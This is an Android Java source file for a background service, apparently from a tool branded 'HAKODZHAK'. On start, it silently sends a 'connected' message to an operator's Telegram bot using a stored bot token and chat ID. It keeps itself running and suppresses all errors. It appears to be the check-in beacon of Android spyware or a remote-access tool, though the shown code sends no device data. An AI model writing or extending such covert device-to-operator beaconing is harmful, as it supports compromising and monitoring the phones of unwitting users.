package com.hakodzhak.final;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
public class MyService extends Service {
    String botToken, chatId;
    @Override
    public void onCreate() {
        super.onCreate();
        botToken = getSharedPreferences("config", MODE_PRIVATE).getString("botToken", "");
        chatId = getSharedPreferences("config", MODE_PRIVATE).getString("chatId", "");
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode("👑 HAKODZHAK متصل.", "UTF-8");
            HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();
            con.getInputStream();
        } catch (Exception e) {}
        return START_STICKY;
    }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
